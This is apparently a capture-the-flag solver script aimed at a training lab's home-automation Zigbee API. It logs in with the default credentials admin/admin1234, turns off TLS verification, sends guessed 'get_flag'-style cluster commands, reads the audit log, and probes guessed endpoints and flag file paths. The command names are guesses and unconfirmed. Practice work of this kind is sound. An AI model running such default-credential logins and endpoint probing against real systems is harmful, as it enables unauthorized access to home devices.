#!/usr/bin/env python3
import requests
import json
import base64
import time

# Get token
resp = requests.post("http://training-pod2.ctfchile.com:32780/api/v2/auth/login",
                    json={"username":"admin","password":"admin1234"})
token = resp.json()["access_token"]
headers = {"Authorization": f"Bearer {token}", "Content-Type": "application/json"}

print("[*] === FINAL FLAG EXTRACTION FROM SHADOW COORDINATOR ===")

# Target the compromised coordinator directly
https_target = "https://training.my-ctf.com:8812"

print("\\n[1] Analyzing compromised coordinator entity...")
resp = requests.get(f"{https_target}/api/v2/states", headers=headers, verify=False)
entities = resp.json().get('entities', [])
coordinator = next((e for e in entities if e.get('nwk') == '0x0000'), None)

if coordinator:
    print(f"Coordinator state: {coordinator.get('state')}")
    print(f"Override status: {coordinator.get('user_override')} by {coordinator.get('overridden_by')}")

print("\\n[2] Trying direct flag extraction commands on Shadow Coordinator...")

# Since the coordinator is compromised with user_override by admin,
# try to extract flag using the exact IEEE address
flag_commands = [
    {"ieee":"00:12:4B:00:24:AA:10:01","endpoint_id":1,"cluster_id":257,"cluster_type":"in","command":"get_flag","command_type":"server"},
    {"ieee":"00:12:4B:00:24:AA:10:01","cluster_id":257,"attribute":"flag"},
    {"ieee":"00:12:4B:00:24:AA:10:01","cluster_id":257,"command":"read_flag"},
    {"ieee":"00:12:4B:00:24:AA:10:01","cluster_id":257,"command":"extract_coordinator_flag"},
    {"ieee":"00:12:4B:00:24:AA:10:01","cluster_id":257,"command":"shadow_flag"},
]

for i, cmd in enumerate(flag_commands):
    print(f"\\n[2.{i+1}] Command: {list(cmd.keys())}")

    if 'attribute' in cmd:
        service = 'get_zigbee_cluster_attribute'
    else:
        service = 'issue_zigbee_cluster_command'

    try:
        resp = requests.post(f"{https_target}/api/v2/services/zha/{service}",
                           headers=headers, json=cmd, verify=False)
        result = resp.json()
        print(f"    Response: {result}")

        # Wait and check audit log for responses
        time.sleep(1)
        audit_resp = requests.get(f"{https_target}/api/v2/system/audit-log", headers=headers, verify=False)
        if audit_resp.status_code == 200:
            recent_entries = audit_resp.json().get('entries', [])[:2]
            for entry in recent_entries:
                if 'flag' in json.dumps(entry).lower():
                    print(f"    [!] AUDIT RESPONSE: {json.dumps(entry, indent=4)}")
    except Exception as e:
        print(f"    Error: {e}")

print("\\n[3] Checking if flag is hidden in coordinator's raw data...")

# Try to get raw device information
device_endpoints = [
    f"/api/v2/zigbee/device/0x0000",
    f"/api/v2/device/coordinator",
    f"/api/v2/zha/device/00:12:4B:00:24:AA:10:01",
    f"/api/v2/coordinator/status"
]

for endpoint in device_endpoints:
    try:
        resp = requests.get(f"{https_target}{endpoint}", headers=headers, verify=False)
        if resp.status_code == 200:
            data = resp.json()
            data_str = json.dumps(data)
            if any(word in data_str.lower() for word in ['flag', 'ctf', 'shadow']):
                print(f"[!] FLAG DATA in {endpoint}:")
                print(json.dumps(data, indent=2))
    except:
        pass

print("\\n[4] Analyzing coordinator IEEE address and other identifiers...")

# The IEEE address might encode information
ieee = "00:12:4B:00:24:AA:10:01"
print(f"Coordinator IEEE: {ieee}")

# Try different interpretations of the IEEE address
ieee_bytes = bytes.fromhex(ieee.replace(':', ''))
print(f"IEEE as bytes: {ieee_bytes}")
print(f"IEEE reversed: {ieee_bytes[::-1]}")

# Check if any part decodes to text
for i in range(len(ieee_bytes) - 3):
    chunk = ieee_bytes[i:i+4]
    try:
        text = chunk.decode('utf-8', errors='ignore')
        if text.isprintable() and len(text.strip()) > 1:
            print(f"Text chunk at {i}: {text}")
    except:
        pass

print("\\n[5] Final attempt: Direct flag file access on Shadow Coordinator...")

# Try accessing potential flag files directly on the HTTPS target
flag_paths = [
    "/shadow_coordinator_flag.txt",
    "/coordinator_unlocked.txt",
    "/flag.txt",
    "/internal/flag",
    "/api/v2/coordinator/flag",
    "/diagnostics/coordinator_flag",
    "/static/shadow_flag.txt"
]

for path in flag_paths:
    try:
        resp = requests.get(f"{https_target}{path}", headers=headers, verify=False)
        if resp.status_code == 200 and 'html' not in resp.text.lower():
            content = resp.text.strip()
            if content and len(content) < 200:  # Reasonable flag length
                print(f"[!] POTENTIAL FLAG FILE {path}:")
                print(f"    Content: {content}")
                if any(word in content.lower() for word in ['flag', 'ctf', 'shadow']):
                    print(f"    [!] CONFIRMED FLAG: {content}")
    except:
        pass

print("\\n[*] Final extraction attempt complete.")
print("\\n[*] The compromised coordinator state 'unlocked' may itself be a clue.")
print("    Check if 'unlocked' refers to a specific unlock code or access method.")